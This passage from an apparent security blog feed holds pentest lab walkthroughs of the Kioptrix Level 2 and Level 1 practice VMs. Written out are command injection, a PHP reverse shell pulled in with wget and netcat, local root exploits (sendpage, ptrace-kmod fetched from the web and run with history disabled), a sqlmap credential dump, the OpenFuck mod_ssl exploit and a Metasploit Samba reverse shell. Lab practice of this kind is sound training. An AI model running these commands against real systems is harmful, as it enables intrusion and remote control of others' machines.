<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>; uname -a
</span><span class='line'>
</span><span class='line'>Linux kioptrix.level2 2.6.9-55.EL #1 Wed May 2 13:52:16 EDT 2007 i686 athlon i386 GNU/Linux</span></code></pre></td></tr></table></div></figure>


<p>The semicolon is used to run multiple commands, so in this case I am closing the ping command and inputting another one after it. I tried poking around, checking if I can read /etc/shadow (which I can&rsquo;t, only /etc/passwd). The commands are ran by the <strong>apache</strong> user. So I&rsquo;m thinking, it&rsquo;s time for some PHP backdoor fun! I found some on Kali in <code>/usr/share/webshells/php</code></p>

<p>First, I&rsquo;m going to copy the reverse PHP shell to my home directory and rename it:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cp php-reverse-shell.php ~/shell.php</span></code></pre></td></tr></table></div></figure>


<p>Let&rsquo;s see the description:</p>

<blockquote><p>This script will make an outbound TCP connection to a hardcoded IP and port.
The recipient will be given a shell running as the current user (apache normally).</p></blockquote>

<p>Next I looked at the Php code, and I need to change the IP and port. The IP is the address of the attacker machine, and for the port I just threw 80 in there, since an outbound connection to port 80 is guaranteed to be allowed (if there was a firewall in place).</p>

<p>With that done, the next step is to serve the shell on my machine and use the web interface to download it to the target host.</p>

<p>On my machine:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nc -v -l -p 80 &lt; shell.php</span></code></pre></td></tr></table></div></figure>


<p>On the web interface:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>; wget 192.168.127.159:80 -O /tmp/puppies.php 
</span><span class='line'>
</span><span class='line'>; ls /tmp
</span><span class='line'>
</span><span class='line'>puppies.php</span></code></pre></td></tr></table></div></figure>


<p>Now listen on my machine for the incoming connection:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nc -v -l -p 80 </span></code></pre></td></tr></table></div></figure>


<p>And on the web interface, execute the shell:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>; php /tmp/puppies.php</span></code></pre></td></tr></table></div></figure>


<p>And we have a shell!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nc: connect to 192.168.127.159 80 from 192.168.127.162 (192.168.127.162) 32772 [32772]
</span><span class='line'>Linux kioptrix.level2 2.6.9-55.EL #1 Wed May 2 13:52:16 EDT 2007 i686 athlon i386 GNU/Linux
</span><span class='line'> 13:15:37 up  2:21,  0 users,  load average: 0.00, 0.00, 0.00
</span><span class='line'>USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
</span><span class='line'>uid=48(apache) gid=48(apache) groups=48(apache)
</span><span class='line'>sh: no job control in this shell</span></code></pre></td></tr></table></div></figure>


<p>It&rsquo;s time for privilege escalation! I will use the sendpage exploit:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cp /usr/share/exploitdb/platforms/linux/local/9545.c ~/sendpage.c
</span><span class='line'>nc -vv -l -p 5555 &lt; sendpage.c</span></code></pre></td></tr></table></div></figure>


<p>And from the shell:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sh-3.00# wget 192.168.127.159 -O /tmp/sendpage.c
</span><span class='line'>sh-3.00# cd /tmp
</span><span class='line'>sh-3.00# gcc -o sendpage sendpage.c
</span><span class='line'>sh-3.00# chmod a+x sendpage
</span><span class='line'>sh-3.00# ./sendpage
</span><span class='line'>sh: no job control in this shell
</span><span class='line'>sh-3.00# whoami
</span><span class='line'>root</span></code></pre></td></tr></table></div></figure>


<h3>Breaking into the database</h3>

<p>I will now explore a different attack vector, by using <strong>sqlmap</strong> to dump the juicy stuff of the database.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sqlmap -u "http://192.168.127.162/index.php" --dbms=MySQL --dump --data "uname=test&psw=pass" --level=5 --risk=3
</span><span class='line'>Database: webapp
</span><span class='line'>Table: users
</span><span class='line'>[2 entries]
</span><span class='line'>+----+----------+------------+
</span><span class='line'>| id | username | password   |
</span><span class='line'>+----+----------+------------+
</span><span class='line'>| 1  | admin    | 5afac8d85f |
</span><span class='line'>| 2  | john     | 66lajGGbla |
</span><span class='line'>+----+----------+------------+</span></code></pre></td></tr></table></div></figure>


<p>I couldn&rsquo;t connect to the MySQL database though, so didn&rsquo;t find a use for these credentials.</p>

<p>I also tried an exploit against the CUPS daemon, to no avail. So I guess this is it for level 2.</p>

<blockquote><p>You have an unusual magnetic personality.  Don&rsquo;t walk too close to
metal objects which are not fastened down.</p></blockquote>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Pentest lab - Kioptrix Level 1]]></title>
    <link href="http://chousensha.github.io/blog/2014/06/12/pentest-lab-kioptrix-level-1/"/>
    <updated>2014-06-12T22:45:37+03:00</updated>
    <id>http://chousensha.github.io/blog/2014/06/12/pentest-lab-kioptrix-level-1</id>
    <content type="html"><![CDATA[<p>For today&rsquo;s pentest lab, I will use the Kioptrix Level 1 virtual machine as the target. Kioptrix Level 1 is the first in a series of vulnerable machines for beginner penetration testing practice.</p>

<!-- more -->


<p>First, to get its IP address, I had to ping sweep the subnet with the following command:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -sP 192.168.127.0/24</span></code></pre></td></tr></table></div></figure>


<p>By correlating the MAC address information from the scan with that from VMware, I now know the IP for the machine is 192.168.127.153.</p>

<p>Now, port scan the target:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# nmap -A -p1-65535 192.168.127.153
</span><span class='line'>
</span><span class='line'>Starting Nmap 6.46 ( http://nmap.org ) at 2014-06-12 22:56 EEST
</span><span class='line'>Nmap scan report for 192.168.127.153
</span><span class='line'>Host is up (0.00035s latency).
</span><span class='line'>Not shown: 65529 closed ports
</span><span class='line'>PORT     STATE SERVICE     VERSION
</span><span class='line'>22/tcp   open  ssh         OpenSSH 2.9p2 (protocol 1.99)
</span><span class='line'>|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
</span><span class='line'>|_sshv1: Server supports SSHv1
</span><span class='line'>80/tcp   open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
</span><span class='line'>| http-methods: Potentially risky methods: TRACE
</span><span class='line'>|_See http://nmap.org/nsedoc/scripts/http-methods.html
</span><span class='line'>|_http-title: Test Page for the Apache Web Server on Red Hat Linux
</span><span class='line'>111/tcp  open  rpcbind     2 (RPC #100000)
</span><span class='line'>| rpcinfo: 
</span><span class='line'>|   program version   port/proto  service
</span><span class='line'>|   100000  2            111/tcp  rpcbind
</span><span class='line'>|   100000  2            111/udp  rpcbind
</span><span class='line'>|   100024  1           1024/tcp  status
</span><span class='line'>|_  100024  1           1024/udp  status
</span><span class='line'>139/tcp  open  netbios-ssn Samba smbd (workgroup: MYGROUP)
</span><span class='line'>443/tcp  open  ssl/http    Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
</span><span class='line'>| http-methods: Potentially risky methods: TRACE
</span><span class='line'>|_See http://nmap.org/nsedoc/scripts/http-methods.html
</span><span class='line'>|_http-title: Test Page for the Apache Web Server on Red Hat Linux
</span><span class='line'>| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
</span><span class='line'>| Not valid before: 2009-09-26T08:32:06+00:00
</span><span class='line'>|_Not valid after:  2010-09-26T08:32:06+00:00
</span><span class='line'>|_ssl-date: 2014-06-12T19:58:14+00:00; +1m51s from local time.
</span><span class='line'>| sslv2: 
</span><span class='line'>|   SSLv2 supported
</span><span class='line'>|   ciphers: 
</span><span class='line'>|     SSL2_DES_192_EDE3_CBC_WITH_MD5
</span><span class='line'>|     SSL2_RC2_CBC_128_CBC_WITH_MD5
</span><span class='line'>|     SSL2_RC4_128_WITH_MD5
</span><span class='line'>|     SSL2_RC4_64_WITH_MD5
</span><span class='line'>|     SSL2_DES_64_CBC_WITH_MD5
</span><span class='line'>|     SSL2_RC2_CBC_128_CBC_WITH_MD5
</span><span class='line'>|_    SSL2_RC4_128_EXPORT40_WITH_MD5
</span><span class='line'>1024/tcp open  status      1 (RPC #100024)
</span><span class='line'>| rpcinfo: 
</span><span class='line'>|   program version   port/proto  service
</span><span class='line'>|   100000  2            111/tcp  rpcbind
</span><span class='line'>|   100000  2            111/udp  rpcbind
</span><span class='line'>|   100024  1           1024/tcp  status
</span><span class='line'>|_  100024  1           1024/udp  status
</span><span class='line'>MAC Address: 00:0C:29:1A:EE:9E (VMware)
</span><span class='line'>Device type: general purpose
</span><span class='line'>Running: Linux 2.4.X
</span><span class='line'>OS CPE: cpe:/o:linux:linux_kernel:2.4
</span><span class='line'>OS details: Linux 2.4.9 - 2.4.18 (likely embedded)
</span><span class='line'>Network Distance: 1 hop
</span><span class='line'>
</span><span class='line'>Host script results:
</span><span class='line'>|_nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)
</span><span class='line'>
</span><span class='line'>TRACEROUTE
</span><span class='line'>HOP RTT     ADDRESS
</span><span class='line'>1   0.35 ms 192.168.127.153
</span><span class='line'>
</span><span class='line'>OS and Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
</span><span class='line'>Nmap done: 1 IP address (1 host up) scanned in 27.11 seconds</span></code></pre></td></tr></table></div></figure>


<h3>Port 22 ssh</h3>

<p>According to Nessus, the SSH version is vulnerable to CVE-2002-0083:</p>

<blockquote><p>Versions prior than 3.1 are vulnerable to an off by one error that allows local users to gain root access, and it may be
possible for remote users to similarly compromise the daemon for remote access.
In addition, a vulnerable SSH client may be compromised by connecting to a malicious SSH daemon that exploits this
vulnerability in the client code, thus compromising the client system.</p></blockquote>

<p>I searched, but I couldn&rsquo;t find a suitable exploit for this, so will leave it at this.</p>

<h3>Port 80 / 443 apache ssl</h3>

<p>Now let&rsquo;s try that outdated Apache server. Here are the results from a Nikto scan against it:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# nikto -host 192.168.127.153
</span><span class='line'>- Nikto v2.1.6
</span><span class='line'>---------------------------------------------------------------------------
</span><span class='line'>+ Target IP:          192.168.127.153
</span><span class='line'>+ Target Hostname:    192.168.127.153
</span><span class='line'>+ Target Port:        80
</span><span class='line'>+ Start Time:         2014-06-13 00:13:08 (GMT3)
</span><span class='line'>---------------------------------------------------------------------------
</span><span class='line'>+ Server: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
</span><span class='line'>+ Server leaks inodes via ETags, header found with file /, inode: 34821, size: 2890, mtime: Thu Sep  6 06:12:46 2001
</span><span class='line'>+ The anti-clickjacking X-Frame-Options header is not present.
</span><span class='line'>+ OSVDB-27487: Apache is vulnerable to XSS via the Expect header
</span><span class='line'>+ Apache/1.3.20 appears to be outdated (current is at least Apache/2.4.7). Apache 2.0.65 (final release) and 2.2.26 are also current.
</span><span class='line'>+ mod_ssl/2.8.4 appears to be outdated (current is at least 2.8.31) (may depend on server version)
</span><span class='line'>+ OpenSSL/0.9.6b appears to be outdated (current is at least 1.0.1e). OpenSSL 0.9.8r is also current.
</span><span class='line'>+ OSVDB-637: Enumeration of users is possible by requesting ~username (responds with 'Forbidden' for users, 'not found' for non-existent users).
</span><span class='line'>+ Allowed HTTP Methods: GET, HEAD, OPTIONS, TRACE 
</span><span class='line'>+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
</span><span class='line'>+ OSVDB-838: Apache/1.3.20 - Apache 1.x up 1.2.34 are vulnerable to a remote DoS and possible code execution. CAN-2002-0392.
</span><span class='line'>+ OSVDB-4552: Apache/1.3.20 - Apache 1.3 below 1.3.27 are vulnerable to a local buffer overflow which allows attackers to kill any process on the system. CAN-2002-0839.
</span><span class='line'>+ OSVDB-2733: Apache/1.3.20 - Apache 1.3 below 1.3.29 are vulnerable to overflows in mod_rewrite and mod_cgi. CAN-2003-0542.
</span><span class='line'>+ mod_ssl/2.8.4 - mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow which may allow a remote shell. CVE-2002-0082, OSVDB-756.
</span><span class='line'>+ ///etc/hosts: The server install allows reading of any system file by adding an extra '/' to the URL.
</span><span class='line'>+ OSVDB-682: /usage/: Webalizer may be installed. Versions lower than 2.01-09 vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
</span><span class='line'>+ OSVDB-3268: /manual/: Directory indexing found.
</span><span class='line'>+ OSVDB-3092: /manual/: Web server manual found.
</span><span class='line'>+ OSVDB-3268: /icons/: Directory indexing found.
</span><span class='line'>+ OSVDB-3233: /icons/README: Apache default file found.
</span><span class='line'>+ OSVDB-3092: /test.php: This might be interesting...
</span><span class='line'>+ 7355 requests: 0 error(s) and 20 item(s) reported on remote host
</span><span class='line'>+ End Time:           2014-06-13 00:13:52 (GMT3) (44 seconds)
</span><span class='line'>---------------------------------------------------------------------------
</span><span class='line'>+ 1 host(s) tested</span></code></pre></td></tr></table></div></figure>


<p>The interesting line that will lead to the exploit is this one:</p>

<p><strong>+ mod_ssl/2.8.4 &ndash; mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow which may allow a remote shell. CVE-2002-0082, OSVDB-756.</strong></p>

<blockquote><p>mod_ssl &lt; 2.8.7 is vulnerable to a remotely exploitable buffer overflow when attempting to cache SSL sessions. This allows for remote code > execution, and the modification of any file on the system.</p></blockquote>

<p>An exploit is available at <a href="http://www.exploit-db.com/exploits/764/">http://www.exploit-db.com/exploits/764/</a></p>

<p>Before jumping in, a little modification is necessary because the exploit is old. If we try to compile right away we will get a bunch of errors. So let&rsquo;s make the changes.</p>

<p>If you don&rsquo;t already have it, install the libssl-dev library:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> apt-get install libssl-dev</span></code></pre></td></tr></table></div></figure>


<p>Now add the following lines in the C source code:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>#include &lt;openssl/rc4.h&gt;
</span><span class='line'>#include &lt;openssl/md5.h&gt;</span></code></pre></td></tr></table></div></figure>


<p>Next, search for wget in the source and replace the URL with the newer one:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>http://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c</span></code></pre></td></tr></table></div></figure>


<p>In the <em>get_server_hello</em> function, change the declaration</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>unsigned char *p, *end; </span></code></pre></td></tr></table></div></figure>


<p>to</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>const unsigned char *p, *end;</span></code></pre></td></tr></table></div></figure>


<p>Now we can compile the exploit:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>gcc -o openfuck openfuck.c -lcrypto</span></code></pre></td></tr></table></div></figure>


<p>Now, if you run it, you will see a range of supported offsets. From our previous scan, we know those applicable to our target are the redhat 1.3.20 versions. We can manually search for them in the offsets or run the following:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>./openfuck | grep -i redhat | grep "1.3.20"</span></code></pre></td></tr></table></div></figure>


<p>This will give us 2 offsets:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>0x6a - RedHat Linux 7.2 (apache-1.3.20-16)1
</span><span class='line'>
</span><span class='line'>0x6b - RedHat Linux 7.2 (apache-1.3.20-16)2</span></code></pre></td></tr></table></div></figure>


<p>So, let&rsquo;s try it out:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>./openfuck 0x6a 192.168.127.153 443
</span><span class='line'>
</span><span class='line'>Establishing SSL connection
</span><span class='line'>
</span><span class='line'>cipher: 0x4043808c   ciphers: 0x80fe500
</span><span class='line'>
</span><span class='line'>Ready to send shellcode
</span><span class='line'>
</span><span class='line'>Spawning shell...
</span><span class='line'>
</span><span class='line'>Good Bye!</span></code></pre></td></tr></table></div></figure>


<p>Ok, that one didn&rsquo;t work. Let&rsquo;s try the other one:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>./openfuck 0x6b 192.168.127.153 443
</span><span class='line'>
</span><span class='line'>Establishing SSL connection
</span><span class='line'>
</span><span class='line'>cipher: 0x4043808c   ciphers: 0x80fc4e8
</span><span class='line'>
</span><span class='line'>Ready to send shellcode
</span><span class='line'>
</span><span class='line'>Spawning shell...
</span><span class='line'>
</span><span class='line'>bash: no job control in this shell
</span><span class='line'>
</span><span class='line'>bash-2.05$
</span><span class='line'>
</span><span class='line'>bash-2.05$ unset HISTFILE; cd /tmp; wget http://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c; gcc -o p ptrace-kmod.c; rm ptrace-kmod.c; ./p;
</span><span class='line'>
</span><span class='line'>--14:29:59--  http://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c
</span><span class='line'>
</span><span class='line'>           =&gt; `ptrace-kmod.c'
</span><span class='line'>
</span><span class='line'>Connecting to dl.packetstormsecurity.net:80... connected!
</span><span class='line'>
</span><span class='line'>HTTP request sent, awaiting response... 200 OK
</span><span class='line'>
</span><span class='line'>Length: 3,921 [text/x-csrc]
</span><span class='line'>
</span><span class='line'>    0K ...                                                   100% @   3.74 MB/s
</span><span class='line'>
</span><span class='line'>14:30:00 (3.74 MB/s) - `ptrace-kmod.c' saved [3921/3921]
</span><span class='line'>
</span><span class='line'>[+] Attached to 1444
</span><span class='line'>
</span><span class='line'>[+] Waiting for signal
</span><span class='line'>
</span><span class='line'>[+] Signal caught
</span><span class='line'>
</span><span class='line'>[+] Shellcode placed at 0x4001189d
</span><span class='line'>
</span><span class='line'>[+] Now wait for suid shell...
</span><span class='line'>
</span><span class='line'>whoami
</span><span class='line'>
</span><span class='line'>root</span></code></pre></td></tr></table></div></figure>


<p>And we got a shell!</p>

<h3>Port 139 samba</h3>

<p>The exploit for this is available in Metasploit:</p>

<p><strong>Samba trans2open Overflow (Linux x86)</strong></p>

<blockquote><p>This exploits the buffer overflow found in Samba versions 2.2.0 to 2.2.8. This particular module is capable of exploiting the flaw on x86 > Linux systems that do not have the noexec stack option set. NOTE: Some older versions of RedHat do not seem to be vulnerable since they
apparently do not allow anonymous access to IPC.</p></blockquote>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; use exploit/linux/samba/trans2open
</span><span class='line'>msf exploit(trans2open) &gt; show options
</span><span class='line'>
</span><span class='line'>Module options (exploit/linux/samba/trans2open):
</span><span class='line'>
</span><span class='line'>   Name   Current Setting  Required  Description
</span><span class='line'>   ----   ---------------  --------  -----------
</span><span class='line'>   RHOST                   yes       The target address
</span><span class='line'>   RPORT  139              yes       The target port
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Exploit target:
</span><span class='line'>
</span><span class='line'>   Id  Name
</span><span class='line'>   --  ----
</span><span class='line'>   0   Samba 2.2.x - Bruteforce
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>msf exploit(trans2open) &gt; set RHOST 192.168.127.153
</span><span class='line'>RHOST =&gt; 192.168.127.153
</span><span class='line'>msf exploit(trans2open) &gt; set payload linux/x86/shell_reverse_tcp 
</span><span class='line'>payload =&gt; linux/x86/shell_reverse_tcp
</span><span class='line'>msf exploit(trans2open) &gt; set LHOST 192.168.127.159
</span><span class='line'>LHOST =&gt; 192.168.127.159
</span><span class='line'>msf exploit(trans2open) &gt; exploit
</span><span class='line'>
</span><span class='line'>[*] Started reverse handler on 192.168.127.159:4444 
</span><span class='line'>[*] Trying return address 0xbffffdfc...
</span><span class='line'>[*] Trying return address 0xbffffcfc...
</span><span class='line'>[*] Trying return address 0xbffffbfc...
</span><span class='line'>[*] Trying return address 0xbffffafc...
</span><span class='line'>[*] Trying return address 0xbffff9fc...
</span><span class='line'>[*] Command shell session 1 opened (192.168.127.159:4444 -&gt; 192.168.127.153:1047) at 2014-06-13 00:31:15 +0300
</span><span class='line'>[*] Command shell session 2 opened (192.168.127.159:4444 -&gt; 192.168.127.153:1048) at 2014-06-13 00:31:15 +0300
</span><span class='line'>
</span><span class='line'>whoami
</span><span class='line'>root</span></code></pre></td></tr></table></div></figure>


<p>There is a flag present on this machine, which is located here:</p>

<p><code>/var/spool/mail/root</code></p>

<blockquote><p>If you are reading this, you got root. Congratulations.
Level 2 won&rsquo;t be as easy&hellip;</p></blockquote>

<p>And this was the first level in the Kioptrix series. Here&rsquo;s a cookie till next time:</p>

<blockquote><p>You&rsquo;re a card which will have to be dealt with.</p></blockquote>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Network tools - netstat]]></title>
    <link href="http://chousensha.github.io/blog/2014/06/11/network-tools-netstat/"/>
    <updated>2014-06-11T21:14:59+03:00</updated>
    <id>http://chousensha.github.io/blog/2014/06/11/network-tools-netstat</id>
